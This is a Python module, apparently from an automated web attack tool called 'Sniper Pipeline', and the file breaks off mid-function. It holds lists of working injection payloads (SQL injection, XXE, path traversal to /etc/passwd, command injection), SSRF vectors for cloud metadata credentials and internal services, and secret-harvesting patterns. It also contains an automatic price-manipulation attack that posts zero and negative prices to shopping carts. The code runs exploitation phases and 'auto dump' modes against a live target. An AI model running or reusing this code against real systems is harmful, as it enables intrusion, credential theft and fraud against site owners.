import asyncio
import hashlib
import httpx
import json
import time
import re
import sys
import os
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin

from scanner.sniper_engine import (
    SniperEngine, SniperReport, ProbeResult, emit, log as sniper_log,
    validate_target, parse_findings, detect_ecommerce_routes,
    SQL_ERROR_PATTERNS, BLOCKED_HOSTS
)
from scanner.attack_reasoning import DecisionTree
from scanner.adversarial_engine import AdversarialStateMachine
from scanner.chain_intelligence import ExploitationChainIntelligence
from scanner.hacker_reasoning import HackerReasoningEngine
from scanner.ghost_recon import GhostReconEngine
from scanner.sniper_decision_engine import SniperDecisionEngine
from scanner.autonomous_engine import AutonomousConsolidator


STACK_TRACE_PATTERNS = [
    re.compile(r"Traceback \(most recent call last\)", re.I),
    re.compile(r"at\s+[\w\.$]+\([\w]+\.java:\d+\)", re.I),
    re.compile(r"File\s+\"[^\"]+\",\s+line\s+\d+", re.I),
    re.compile(r"TypeError:|ValueError:|KeyError:|AttributeError:", re.I),
    re.compile(r"Exception in thread", re.I),
    re.compile(r"System\.NullReferenceException", re.I),
    re.compile(r"Fatal error:.*on line \d+", re.I),
    re.compile(r"node_modules/", re.I),
    re.compile(r"at Object\.<anonymous>", re.I),
    re.compile(r"SQLSTATE\[", re.I),
    re.compile(r"pg_query\(\):", re.I),
    re.compile(r"PDOException", re.I),
    re.compile(r"ActiveRecord::StatementInvalid", re.I),
    re.compile(r"django\.db\.utils\.", re.I),
    re.compile(r"org\.springframework\.", re.I),
]

MOCK_RELAY_PATTERNS = [
    re.compile(r"r3d1s_pr0d", re.I),
    re.compile(r"AKIAIOSFODNN7EXAMPLE", re.I),
    re.compile(r"super_secret", re.I),
    re.compile(r"pr0d_s3cret", re.I),
    re.compile(r"kill_chain:[^\\s]+", re.I),
    re.compile(r"credential relay", re.I),
    re.compile(r"incident absorber", re.I),
    re.compile(r"zero[_\\s-]?redaction", re.I),
]

def _is_mock_relay(value: str) -> bool:
    if not value:
        return False
    return any(p.search(value) for p in MOCK_RELAY_PATTERNS)

def _filter_real(values):
    return [v for v in values if v and not _is_mock_relay(v)]

DB_STRUCTURE_PATTERNS = [
    re.compile(r"table[_\s]name|column[_\s]name|information_schema", re.I),
    re.compile(r"pg_catalog|pg_tables", re.I),
    re.compile(r"mysql\.\w+|sys\.\w+", re.I),
    re.compile(r"CREATE TABLE|ALTER TABLE|DROP TABLE", re.I),
    re.compile(r"SELECT\s+\*?\s+FROM\s+\w+", re.I),
    re.compile(r"INSERT INTO|UPDATE\s+\w+\s+SET", re.I),
    re.compile(r"database_name|current_database|version\(\)", re.I),
]

ENV_SECRET_PATTERNS = [
    re.compile(r'(?i)(DATABASE_URL|DB_URI|MONGO_URI|REDIS_URL)\s*=\s*(.+)'),
    re.compile(r'(?i)(AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\s*=\s*(.+)'),
    re.compile(r'(?i)(STRIPE_SECRET_KEY|STRIPE_LIVE_KEY|sk_live_\w+)\s*=\s*(.+)'),
    re.compile(r'(?i)(JWT_SECRET|SESSION_SECRET|APP_SECRET|SECRET_KEY)\s*=\s*(.+)'),
    re.compile(r'(?i)(PRIVATE_KEY|API_KEY|AUTH_TOKEN|ACCESS_TOKEN)\s*=\s*(.+)'),
    re.compile(r'(?i)(SENDGRID_API_KEY|TWILIO_AUTH_TOKEN|MAILGUN_API_KEY)\s*=\s*(.+)'),
    re.compile(r'(?i)(FIREBASE_\w+|GOOGLE_CLIENT_SECRET|GCP_\w+)\s*=\s*(.+)'),
    re.compile(r'(?i)(POSTGRES_PASSWORD|MYSQL_PASSWORD|REDIS_PASSWORD)\s*=\s*(.+)'),
    re.compile(r'(?i)(OAUTH_\w+_SECRET|CLIENT_SECRET)\s*=\s*(.+)'),
    re.compile(r'(?i)(ENCRYPTION_KEY|SIGNING_KEY|HMAC_SECRET)\s*=\s*(.+)'),
]

GIT_OBJECT_PATHS = [
    "/.git/HEAD",
    "/.git/config",
    "/.git/COMMIT_EDITMSG",
    "/.git/description",
    "/.git/info/refs",
    "/.git/logs/HEAD",
    "/.git/refs/heads/main",
    "/.git/refs/heads/master",
    "/.git/packed-refs",
    "/.git/objects/info/packs",
]

DOCKER_INSPECT_ENDPOINTS = [
    {"path": "/containers/json", "label": "Container List", "detect": ["Id", "Names", "Image", "State"]},
    {"path": "/images/json", "label": "Image Inventory", "detect": ["RepoTags", "Size", "Created"]},
    {"path": "/networks", "label": "Network Config", "detect": ["Name", "Scope", "Driver"]},
    {"path": "/volumes", "label": "Volume Mounts", "detect": ["Name", "Mountpoint", "Driver"]},
    {"path": "/info", "label": "Docker Engine Info", "detect": ["ServerVersion", "OperatingSystem", "NCPU", "MemTotal"]},
]

IMDSV2_CREDENTIAL_PATHS = [
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",
    "/latest/meta-data/hostname",
    "/latest/meta-data/local-ipv4",
    "/latest/meta-data/public-keys/",
    "/latest/dynamic/instance-identity/document",
    "/latest/user-data",
]

SSRF_INTERNAL_VECTORS = [
    {
        "name": "AWS EC2 Metadata (IMDSv1)",
        "url": "http://169.254.169.254/latest/meta-data/",
        "detect": ["ami-id", "instance-id", "hostname", "iam", "security-credentials"],
        "severity": "CRITICAL",
    },
    {
        "name": "AWS EC2 Metadata (IMDSv2 token)",
        "url": "http://169.254.169.254/latest/api/token",
        "detect": ["token", "TTL"],
        "severity": "CRITICAL",
    },
    {
        "name": "Localhost Redis (default port)",
        "url": "http://127.0.0.1:6379/info",
        "detect": ["redis_version", "REDIS", "ERR", "connected_clients"],
        "severity": "CRITICAL",
    },
    {
        "name": "Localhost Redis (SLAVEOF probe)",
        "url": "http://127.0.0.1:6379",
        "detect": ["redis", "-ERR", "DENIED"],
        "severity": "HIGH",
    },
    {
        "name": "GCP Metadata",
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "detect": ["project-id", "zone", "instance"],
        "severity": "CRITICAL",
    },
    {
        "name": "Azure Metadata",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "detect": ["vmId", "subscriptionId", "resourceGroupName"],
        "severity": "CRITICAL",
    },
    {
        "name": "Kubernetes Service Account",
        "url": "http://127.0.0.1:10255/pods",
        "detect": ["metadata", "namespace", "containers"],
        "severity": "CRITICAL",
    },
    {
        "name": "Docker Socket Probe",
        "url": "http://127.0.0.1:2375/version",
        "detect": ["ApiVersion", "GitCommit", "GoVersion"],
        "severity": "CRITICAL",
    },
    {
        "name": "Consul Agent",
        "url": "http://127.0.0.1:8500/v1/agent/self",
        "detect": ["Config", "Member", "DebugConfig"],
        "severity": "HIGH",
    },
    {
        "name": "Elasticsearch",
        "url": "http://127.0.0.1:9200/_cluster/health",
        "detect": ["cluster_name", "status", "number_of_nodes"],
        "severity": "HIGH",
    },
]

INPUT_VALIDATION_PAYLOADS = [
    {
        "name": "SQL Error Leak (OR injection)",
        "payload": "' OR '1'='1' --",
        "type": "sqli",
    },
    {
        "name": "SQL Error Leak (UNION probe)",
        "payload": "1 UNION SELECT NULL,table_name FROM information_schema.tables--",
        "type": "sqli",
    },
    {
        "name": "PostgreSQL version extraction",
        "payload": "1' AND 1=CAST((SELECT version()) AS int)--",
        "type": "sqli",
    },
    {
        "name": "JSON Type Confusion",
        "payload": '{"__proto__":{"admin":true},"id":"1\' OR 1=1--"}',
        "type": "nosqli",
    },
    {
        "name": "SSTI Probe (Jinja2/Twig)",
        "payload": "{{7*7}}${7*7}<%=7*7%>",
        "type": "ssti",
    },
    {
        "name": "Path Traversal (etc/passwd)",
        "payload": "../../../../../etc/passwd",
        "type": "traversal",
    },
    {
        "name": "XML External Entity (XXE)",
        "payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        "type": "xxe",
    },
    {
        "name": "Command Injection (pipe)",
        "payload": "test|cat /etc/hostname",
        "type": "cmdi",
    },
]


def _ts() -> str:
    return time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime()) + f".{int(time.time() * 1000) % 1000:03d}"


def pipeline_emit(event_type: str, data: dict):
    payload = {"event": f"pipeline:{event_type}", "data": data, "timestamp": time.time()}
    print(json.dumps(payload), flush=True)


def pipeline_log(message: str, level: str = "info", phase: str = "pipeline"):
    pipeline_emit("log_stream", {"message": message, "level": level, "phase": phase})


RISK_SEVERITY_WEIGHT = {
    "critical": 1.0,
    "high": 0.75,
    "medium": 0.4,
    "low": 0.1,
    "info": 0.0,
}

RISK_CONFIDENCE_MAP = {
    "confirmed": 1.0,
    "inferred": 0.6,
    "theoretical": 0.3,
}

CONFIRMED_KEYWORDS = [
    "confirmed", "validated", "success", "dump", "accessible", "exposed", "leaked",
    "vulnerable", "found in", "detected", "extracted",
]
INFERRED_KEYWORDS = [
    "possible", "potential", "may ", "likely", "suspected", "indicates",
]


class RiskScoreEngine:
    @staticmethod
    def _classify_confidence(finding: Dict) -> str:
        desc = (finding.get("description", "") or "").lower()
        title = (finding.get("title", "") or "").lower()
        evidence = (finding.get("evidence", "") or "").lower()
        combined = f"{title} {desc} {evidence}"

        if any(kw in combined for kw in CONFIRMED_KEYWORDS):
            return "confirmed"
        if any(kw in combined for kw in INFERRED_KEYWORDS):
            return "inferred"
        severity = (finding.get("severity", "") or "").lower()
        if severity in ("critical", "high"):
            return "confirmed"
        return "inferred"

    @staticmethod
    def _has_evidence_confirmation(finding: Dict) -> bool:
        desc = (finding.get("description", "") or "").lower()
        title = (finding.get("title", "") or "").lower()
        evidence = (finding.get("evidence", "") or "").lower()
        combined = f"{title} {desc} {evidence}"
        return any(kw in combined for kw in CONFIRMED_KEYWORDS)

    @staticmethod
    def calculate(findings: List[Dict]) -> Dict:
        if not findings:
            return {
                "score": 0.0,
                "mode": "ACTIVE_EXPLORATION",
                "auto_dump": False,
                "override_reason": None,
                "breakdown": [],
                "total_findings": 0,
            }

        breakdown = []
        critical_confirmed_count = 0
        high_confirmed_count = 0

        for f in findings:
            sev = (f.get("severity", "info") or "info").lower()
            weight = RISK_SEVERITY_WEIGHT.get(sev, 0.0)
            confidence = RiskScoreEngine._classify_confidence(f)
            conf_weight = RISK_CONFIDENCE_MAP.get(confidence, 0.3)
            contribution = weight * conf_weight
            breakdown.append({
                "title": (f.get("title", "") or "")[:60],
                "severity": sev,
                "confidence": confidence,
                "contribution": round(contribution, 3),
            })
            has_evidence = RiskScoreEngine._has_evidence_confirmation(f)
            if sev == "critical" and has_evidence:
                critical_confirmed_count += 1
            if sev == "high" and has_evidence:
                high_confirmed_count += 1

        override_reason = None
        if critical_confirmed_count >= 1:
            override_reason = f"MAX_SEVERITY_OVERRIDE: {critical_confirmed_count} critical finding(s) with evidence confirmation â€” AUTO_DUMP forced"

        contributions = sorted([b["contribution"] for b in breakdown], reverse=True)
        n = len(contributions)

        if n <= 5:
            score = sum(contributions) / n
        else:
            top_n = max(5, -(-n // 3))
            top_slice = contributions[:top_n]
            rest_slice = contributions[top_n:]
            top_weight = 0.80
            rest_weight = 0.20
            top_avg = sum(top_slice) / len(top_slice)
            rest_avg = sum(rest_slice) / len(rest_slice) if rest_slice else 0.0
            score = (top_avg * top_weight) + (rest_avg * rest_weight)

        score = round(min(score, 1.0), 4)

        if override_reason:
            mode = "AUTO_DUMP"
            auto_dump = True
            score = max(score, 0.90)
        elif score > 0.85:
            mode = "AUTO_DUMP"
            auto_dump = True
        elif score >= 0.5:
            mode = "MIXED"
            auto_dump = False
        else:
            mode = "ACTIVE_EXPLORATION"
            auto_dump = False

        top_contributors = sorted(breakdown, key=lambda x: x["contribution"], reverse=True)[:5]

        return {
            "score": score,
            "mode": mode,
            "auto_dump": auto_dump,
            "override_reason": override_reason,
            "critical_confirmed": critical_confirmed_count,
            "high_confirmed": high_confirmed_count,
            "total_weighted": round(sum(contributions), 3),
            "total_findings": n,
            "top_contributors": top_contributors,
        }


class SniperPipeline:
    def __init__(self, target: str, scan_id: str = ""):
        valid, url_or_err = validate_target(target)
        if not valid:
            raise ValueError(url_or_err)
        self.target = url_or_err
        self.base_url = url_or_err.rstrip("/")
        self.scan_id = scan_id
        self.findings: List[Dict] = []
        self.exposed_assets: List[Dict] = []
        self.probes: List[Dict] = []
        self.telemetry: Dict[str, Any] = {}
        self.phases_completed: List[str] = []
        self.counts = {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
        self._seen_hashes = set()
        self.sniper_report: Optional[Dict] = None
        self.decision_intel_report: Optional[Dict] = None
        self.adversarial_report: Optional[Dict] = None
        self.chain_intel_report: Optional[Dict] = None
        self.hacker_reasoning_report: Optional[Dict] = None
        self.db_validation_report: Optional[Dict] = None
        self.infra_report: Optional[Dict] = None
        self.incident_evidence: Optional[Dict] = None
        self.sinfo_dump: Optional[Dict] = None
        self.git_objects_dump: Optional[Dict] = None
        self.docker_full_dump: Optional[Dict] = None
        self.imdsv2_dump: Optional[Dict] = None
        self.session_tokens_captured: List[Dict] = []
        self.client: Optional[httpx.AsyncClient] = None
        self.started_at = _ts()
        self._auto_dump_triggered: bool = False
        self._risk_score: Optional[Dict] = None
        self._hypothesis: Optional[Dict] = None
        self.ghost_recon_report: Optional[Dict] = None
        self.persistence_assessment: Optional[Dict] = None
        self.executive_report: Optional[Dict] = None
        self.sniper_decision_report: Optional[Dict] = None
        self.autonomous_report: Optional[Dict] = None

    def _generate_finding_hash(self, finding: Dict) -> str:
        normalized = {
            "title": (finding.get("title") or "").strip(),
            "description": (finding.get("description") or "").strip(),
            "endpoint": (finding.get("endpoint") or finding.get("path") or "").strip(),
            "evidence": str(
                finding.get("evidence")
                or finding.get("proof")
                or finding.get("artifacts")
                or ""
            ).strip()[:100],
        }
        serialized = json.dumps(normalized, sort_keys=True, ensure_ascii=False)
        return hashlib.md5(serialized.encode()).hexdigest()

    def _enforce_severity(self, finding: Dict) -> Dict:
        finding = dict(finding)
        severity = (finding.get("severity") or "").upper()

        if severity in ("HIGH", "CRITICAL"):
            evidence = finding.get("evidence") or finding.get("proof") or finding.get("artifacts") or ""
            if not evidence:
                finding["warning"] = "Auto-downgraded: missing evidence"
                finding["original_severity"] = severity
                finding["severity"] = "MEDIUM"
                severity = "MEDIUM"
                pipeline_log(f"DOWNSCALE severity (no evidence): {finding.get('title', '')}", "warn", "severity_enforcer")
            else:
                evidence_str = str(evidence)
                if len(evidence_str) < 10 or "example" in evidence_str.lower():
                    finding["warning"] = "Auto-downgraded: insufficient evidence"
                    finding["original_severity"] = severity
                    finding["severity"] = "LOW"
                    severity = "LOW"
                    pipeline_log(f"DOWNSCALE severity (weak evidence): {finding.get('title', '')}", "warn", "severity_enforcer")

        finding["severity"] = severity.lower()
        return finding

    def _add_finding(self, finding: Dict):
        finding = self._enforce_severity(finding)
        fingerprint = self._generate_finding_hash(finding)
        if fingerprint in self._seen_hashes:
            pipeline_log(f"DEDUP: dropping duplicate finding '{finding.get('title', '')}'", "warn", "deduplicator")
            return
        self._seen_hashes.add(fingerprint)

        self.findings.append(finding)
        sev = (finding.get("severity", "info")).lower()
        self.counts["total"] += 1
        if sev in self.counts:
            self.counts[sev] += 1
        pipeline_emit("finding_detected", finding)

    def _add_asset(self, asset: Dict):
        self.exposed_assets.append(asset)
        pipeline_emit("asset_detected", asset)

    def _add_probe(self, probe: Dict):
        self.probes.append(probe)
        pipeline_emit("probe_result", probe)

    async def execute(self) -> Dict:
        pipeline_log(f"SNIPER PIPELINE INITIALIZED â€” Target: {self.target}", "info", "init")
        pipeline_log(f"Scan ID: {self.scan_id}", "info", "init")
        pipeline_emit("phase_update", {"phase": "init", "status": "running"})

        async with httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=5.0),
            follow_redirects=True,
            verify=False,
            headers={"User-Agent": "MSE-SniperPipeline/3.0 (Military Scan Enterprise)"},
        ) as client:
            self.client = client

            await self._phase_0_ghost_recon()
            await self._phase_1_ingest()
            await self._phase_2_exploit()
            await self._phase_2b_decision_intel()
            await self._phase_2c_adversarial()
            await self._phase_risk_score()
            await self._phase_2d_chain_intelligence()
            await self._phase_2e_hacker_reasoning()
            await self._phase_2f_incident_absorber()
            await self._phase_3_db_validation()
            await self._phase_4_infra_ssrf()
            await self._phase_4b_persistence_assessment()
            await self._phase_4c_sniper_decision()
            await self._phase_4d_autonomous_consolidator()
            await self._phase_5_telemetry_report()
            self._build_executive_compromise_report()

        pipeline_log(
            f"PIPELINE COMPLETE â€” {self.counts['total']} findings, "
            f"{self.counts['critical']}C/{self.counts['high']}H/{self.counts['medium']}M",
            "success" if self.counts["critical"] == 0 else "error",
            "complete"
        )

        report = self._build_report()
        pipeline_emit("pipeline_report", report)

        pipeline_emit("hrd_report", self.hacker_reasoning_report or {})

        kill_chain = self._build_kill_chain()
        ssrf_proofs = self._consolidate_ssrf_proofs()
        exploit_tx = self._consolidate_exploit_transactions()

        pipeline_emit("enterprise_dossier", {
            "kill_chain": kill_chain,
            "ssrf_proof_logs": ssrf_proofs,
            "exploit_transaction_logs": exploit_tx,
            "incident_evidence": self.incident_evidence or {},
            "sinfo_dump": self.sinfo_dump or {},
            "git_objects_dump": self.git_objects_dump or {},
            "docker_full_dump": self.docker_full_dump or {},
            "imdsv2_dump": self.imdsv2_dump or {},
            "session_tokens": self.session_tokens_captured,
            "deep_credential_extractions": getattr(self, 'deep_credential_extractions', []),
            "idor_sequential_dumps": getattr(self, 'idor_sequential_dumps', []),
            "auth_bypass_dumps": getattr(self, 'auth_bypass_dumps', []),
            "admin_exploitation_probes": getattr(self, 'admin_exploitation_probes', []),
            "ghost_recon": self.ghost_recon_report or {},
            "persistence_assessment": self.persistence_assessment or {},
            "executive_compromise_report": self.executive_report or {},
            "autonomous_consolidator_report": self.autonomous_report or {},
            "phases_completed": self.phases_completed,
            "pipeline_duration": int((time.time() - time.mktime(time.strptime(self.started_at[:19], "%Y-%m-%d %H:%M:%S"))) * 1000) if self.started_at else 0,
        })

        pipeline_log(
            f"ENTERPRISE DOSSIER READY â€” Kill Chain: {len(kill_chain)} nodes, "
            f"SSRF Proofs: {len(ssrf_proofs)}, Exploit TXs: {len(exploit_tx)}",
            "success", "complete"
        )

        return report

    async def _phase_0_ghost_recon(self):
        pipeline_emit("phase_update", {"phase": "ghost_recon", "status": "running"})
        pipeline_log("[PHASE 0/6] GHOST RECON â€” Zero-footprint passive OSINT...", "warn", "ghost_recon")

        try:
            recon = GhostReconEngine(
                self.target,
                log_fn=pipeline_log,
                emit_fn=pipeline_emit,
            )
            self.ghost_recon_report = await recon.execute()

            total_surface = self.ghost_recon_report.get("total_attack_surface", 0)
            subs = len(self.ghost_recon_report.get("subdomains", []))
            forgotten = len(self.ghost_recon_report.get("forgotten_paths", []))
            confidence = self.ghost_recon_report.get("confidence_score", 0)

            pipeline_log(
                f"[GHOST] Attack surface mapped: {total_surface} total â€” "
                f"{subs} subdomains, {forgotten} forgotten paths, "
                f"confidence: {confidence:.1%}",
                "warn" if total_surface > 0 else "info", "ghost_recon"
            )

            if forgotten > 0:
                forgotten_paths = self.ghost_recon_report.get("forgotten_paths", [])
                self._add_finding({
                    "title": f"Ghost Recon: {forgotten} forgotten endpoints discovered via OSINT",
                    "description": (
                        f"Zero-footprint passive OSINT discovered {forgotten} historical endpoints "
                        f"that may still be accessible: {', '.join(forgotten_paths[:10])}. "
                        f"These paths were found in Wayback Machine archives and Certificate Transparency logs. "
                        f"The target never saw our IP during this reconnaissance."
                    ),
                    "severity": "medium" if forgotten < 5 else "high",
                    "category": "ghost_recon",
                    "module": "ghost_recon",
                    "phase": "ghost_recon",
                    "evidence": f"subdomains={subs}, forgotten_paths={forgotten}, zero_footprint=true",
                })

            if subs > 5:
                interesting = [s for s in self.ghost_recon_report.get("subdomains", [])
                               if any(kw in s for kw in ["admin", "dev", "staging", "test", "internal", "api"])]
                if interesting:
                    self._add_finding({
                        "title": f"Ghost Recon: {len(interesting)} high-value subdomains discovered",
                        "description": (
                            f"Certificate Transparency logs reveal high-value subdomains: "
                            f"{', '.join(interesting[:8])}. These may expose admin panels, "
                            f"staging environments, or internal APIs."
                        ),
                        "severity": "high",
                        "category": "ghost_recon",
                        "module": "ghost_recon",
                        "phase": "ghost_recon",
                        "evidence": f"high_value_subdomains={', '.join(interesting[:5])}",
                    })

        except Exception as e:
            pipeline_log(
                f"[GHOST] Ghost recon completed with partial results: {str(e)[:100]}",
                "info", "ghost_recon"
            )
            self.ghost_recon_report = {"error": str(e)[:200], "zero_footprint": True}

        self.phases_completed.append("ghost_recon")
        pipeline_emit("phase_update", {"phase": "ghost_recon", "status": "completed"})

    async def _phase_1_ingest(self):
        pipeline_emit("phase_update", {"phase": "ingest", "status": "running"})
        pipeline_log("[PHASE 1/6] INGEST â€” Launching full orchestrator scan...", "warn", "ingest")

        from scanner.models import AssessmentJob
        from scanner.config import validate_target as config_validate
        from scanner.modules.surface_mapping import SurfaceMappingModule
        from scanner.modules.waf_detector import WAFDetectorModule
        from scanner.modules.tls_validator import TLSValidatorModule
        from scanner.modules.browser_recon import BrowserReconModule
        from scanner.modules.js_secrets_scanner import JSSecretsModule
        from scanner.modules.headers_analyzer import HeadersAnalyzerModule
        from scanner.modules.cors_analyzer import CORSAnalyzerModule
        from scanner.modules.rate_limit import RateLimitModule
        from scanner.modules.auth_flow import AuthFlowModule
        from scanner.modules.input_validation import InputValidationModule
        from scanner.modules.selenium_xss import SeleniumXSSModule

        validation = config_validate(self.target)
        if not validation["valid"]:
            pipeline_log(f"TARGET REJECTED by allowlist: {validation.get('reason', 'unknown')}", "error", "ingest")
            pipeline_emit("phase_update", {"phase": "ingest", "status": "error"})
            return

        job = AssessmentJob(
            target=self.target,
            hostname=validation["hostname"],
            scheme=validation.get("scheme", "https"),
            port=validation.get("port"),
        )

        phase_modules = {
            "surface": [SurfaceMappingModule, WAFDetectorModule],
            "exposure": [TLSValidatorModule, BrowserReconModule, JSSecretsModule],
            "misconfig": [HeadersAnalyzerModule, CORSAnalyzerModule],
            "simulation": [RateLimitModule, AuthFlowModule, InputValidationModule, SeleniumXSSModule],
        }

        total_modules = sum(len(m) for m in phase_modules.values())
        completed = 0

        for phase_name, modules in phase_modules.items():
            pipeline_log(f"[INGEST] Sub-phase: {phase_name.upper()} ({len(modules)} modules)", "info", "ingest")

            for ModClass in modules:
                module = ModClass()
                module._job_id = job.job_id
                try:
                    module_findings = await asyncio.wait_for(
                        module.run(job),
                        timeout=max(getattr(module, "timeout", 60), 120),
                    )
                    for f in module_findings:
                        finding_dict = {
                            "title": f.title,
                            "description": f.description,
                            "severity": f.severity,
                            "category": getattr(f, "category", ""),
                            "module": getattr(f, "module", module.name if hasattr(module, "name") else ""),
                            "phase": phase_name,
                            "cvss_score": getattr(f, "cvss_score", 0),
                            "remediation": getattr(f, "remediation", ""),
                            "evidence": getattr(f, "evidence", ""),
                        }
                        self._add_finding(finding_dict)
                        job.findings.append(f)

                    pipeline_log(
                        f"[INGEST] {module.name}: {len(module_findings)} findings",
                        "warn" if module_findings else "success",
                        "ingest"
                    )
                except asyncio.TimeoutError:
                    pipeline_log(f"[INGEST] {module.name}: TIMEOUT", "error", "ingest")
                except Exception as e:
                    pipeline_log(f"[INGEST] {module.name}: ERROR â€” {str(e)[:100]}", "error", "ingest")

                completed += 1
                pipeline_emit("telemetry_update", {
                    "progress": int((completed / max(total_modules, 1)) * 40),
                    "phase": "ingest",
                    "activeModules": total_modules - completed,
                    "threatsDetected": self.counts["total"],
                })

        for asset in getattr(job, "exposed_assets", []):
            asset_dict = asset if isinstance(asset, dict) else {
                "path": getattr(asset, "path", str(asset)),
                "asset_type": getattr(asset, "asset_type", "unknown"),
            }
            self._add_asset(asset_dict)

        from scanner.orchestrator import _build_hypothesis
        hypothesis = _build_hypothesis(self.findings)
        self._hypothesis = hypothesis
        if hypothesis["detected_stacks"]:
            pipeline_log(
                f"[HYPOTHESIS] Stack fingerprint: {hypothesis['stack_signature']} "
                f"({', '.join(hypothesis['tech_labels'])})",
                "warn", "ingest"
            )
            pipeline_log(
                f"[HYPOTHESIS] Priority vectors: {', '.join(hypothesis['priority_vectors'][:8])}",
                "warn", "ingest"
            )
            pipeline_emit("stack_hypothesis", hypothesis)
        else:
            pipeline_log(
                "[HYPOTHESIS] No specific stack fingerprint â€” full generic attack surface",
                "info", "ingest"
            )

        self.phases_completed.append("ingest")
        pipeline_emit("phase_update", {"phase": "ingest", "status": "completed"})
        pipeline_log(
            f"[INGEST COMPLETE] {self.counts['total']} findings "
            f"({self.counts['critical']}C/{self.counts['high']}H/{self.counts['medium']}M)",
            "warn" if self.counts["critical"] > 0 else "success",
            "ingest"
        )

    async def _phase_2_exploit(self):
        pipeline_emit("phase_update", {"phase": "exploit", "status": "running"})
        pipeline_log("[PHASE 2/6] EXPLOIT â€” Filtering CRITICAL/HIGH, launching Sniper Engine...", "warn", "exploit")

        crit_high = [f for f in self.findings if f.get("severity", "").lower() in ("critical", "high")]
        pipeline_log(f"[EXPLOIT] {len(crit_high)} CRITICAL/HIGH findings targeted for exploitation", "info", "exploit")

        ecommerce_routes = []
        cart_update_found = False
        for f in self.findings:
            combined = (f.get("title", "") + " " + f.get("description", "")).lower()
            if "/cart/update" in combined:
                cart_update_found = True
            for kw in ["/cart", "/checkout", "/order", "/payment", "/product", "/api/cart"]:
                if kw in combined and kw not in ecommerce_routes:
                    ecommerce_routes.append(kw)

        if cart_update_found:
            pipeline_log("[EXPLOIT] /cart/update DETECTED â€” Firing automatic price manipulation payload", "error", "exploit")
            await self._auto_price_attack()
        elif ecommerce_routes:
            pipeline_log(f"[EXPLOIT] E-commerce routes detected: {', '.join(ecommerce_routes)}", "warn", "exploit")

        try:
            engine = SniperEngine(self.target, crit_high, self.scan_id)
            report = await engine.run_all()
            self.sniper_report = report.to_dict()

            for probe in report.probes:
                self._add_probe(probe.to_dict())

            pipeline_log(
                f"[EXPLOIT] Sniper Engine complete â€” {report.vulnerabilities_confirmed}/{report.total_probes} vulnerabilities confirmed",
                "error" if report.vulnerabilities_confirmed > 0 else "success",
                "exploit"
            )
        except Exception as e:
            pipeline_log(f"[EXPLOIT] Sniper Engine error: {str(e)[:200]}", "error", "exploit")

        self.phases_completed.append("exploit")
        pipeline_emit("phase_update", {"phase": "exploit", "status": "completed"})
        pipeline_emit("telemetry_update", {"progress": 60, "phase": "exploit"})

    async def _auto_price_attack(self):
        payloads = [
            {"endpoint": "/cart/update", "method": "POST", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 1}]}, "desc": "unit_price override to $0.01 (auto-triggered)"},
            {"endpoint": "/cart/update", "method": "POST", "body": {"items": [{"id": 1, "price": -1, "quantity": 1}]}, "desc": "negative price injection"},
            {"endpoint": "/cart/update", "method": "POST", "body": {"items": [{"id": 1, "unit_price": 0.01, "quantity": 99999}]}, "desc": "mass quantity + price override"},
            {"endpoint": "/cart/update", "method": "PATCH", "body": {"line_item_id": 1, "unit_price": 0.00}, "desc": "PATCH zero-price via line_item_id"},
        ]

        for p in payloads:
            url = f"{self.base_url}{p['endpoint']}"
            start = time.time()
            try:
                resp = await self.client.request(
                    p["method"], url,
                    json=p["body"],
                    headers={"Content-Type": "application/json"},
                )
                elapsed = int((time.time() - start) * 1000)
                body_text = resp.text[:2000]

                processed = resp.status_code in (200, 201, 202)
                db_interaction = any(kw in body_text.lower() for kw in [
                    "success", "updated", "created", "order_id", "cart_id",
                    "total", "amount", "price", "quantity",
                ])

                vulnerable = processed and db_interaction
                probe = {
                    "probe_type": "AUTO_PRICE_INJECTION",
                    "target": self.target,
                    "endpoint": p["endpoint"],
                    "method": p["method"],
                    "status_code": resp.status_code,
                    "response_time_ms": elapsed,
                    "vulnerable": vulnerable,
                    "verdict": "VULNERABLE â€” Price accepted by backend (AUTO)" if vulnerable else "PROTECTED",
                    "severity": "CRITICAL" if vulnerable else "INFO",
                    "description": p["desc"],
                    "payload": json.dumps(p["body"]),
                    "evidence": f"Status {resp.status_code}, DB interaction: {db_interaction}",
                    "response_snippet": body_text[:300],
                    "timestamp": _ts(),
                }
                self._add_probe(probe)

                if vulnerable:
                    pipeline_log(f"[THREAT] AUTO PRICE INJECTION CONFIRMED: {p['endpoint']} â€” {p['desc']}", "error", "exploit")
                    self._add_finding({
                        "title": f"Price Manipulation Confirmed: {p['desc']}",
                        "description": f"Backend accepted manipulated price payload at {p['endpoint']}. HTTP {resp.status_code}. Evidence: {body_text[:200]}",
                        "severity": "critical",
                        "category": "ecommerce_logic",
                        "module": "sniper_pipeline",
                        "phase": "exploit",
                        "raw_response": body_text[:2000],
                        "attack_payload": json.dumps(p["body"]),
                        "endpoint": p["endpoint"],
                        "status_code": resp.status_code,
                    })
                else:
                    pipeline_log(f"[BLOCK] Price injection blocked: {p['endpoint']} (HTTP {resp.status_code})", "success", "exploit")

            except Exception as e:
                self._add_probe({
                    "probe_type": "AUTO_PRICE_INJECTION",
                    "target": self.target, "endpoint": p["endpoint"],
                    "method": p["method"], "status_code": 0, "response_time_ms": 0,
                    "vulnerable": False, "verdict": "ERROR", "severity": "INFO",
                    "description": p["desc"], "error": str(e)[:200], "timestamp": _ts(),
                })

    async def _phase_2b_decision_intel(self):
        pipeline_emit("phase_update", {"phase": "decision_intel", "status": "running"})
        pipeline_log(
            "[PHASE 3/6] DECISION INTELLIGENCE â€” Dynamic Attack Reasoning Engine v2.0",
            "warn", "decision_intel"
        )
        pipeline_log(
            "[ZERO-K] Initializing zero-knowledge decision tree from scan findings...",
            "warn", "decision_intel"
        )

        tree = DecisionTree(
            base_url=self.base_url,
            client=self.client,
            log_fn=pipeline_log,
            emit_fn=pipeline_emit,
            add_finding_fn=self._add_finding,
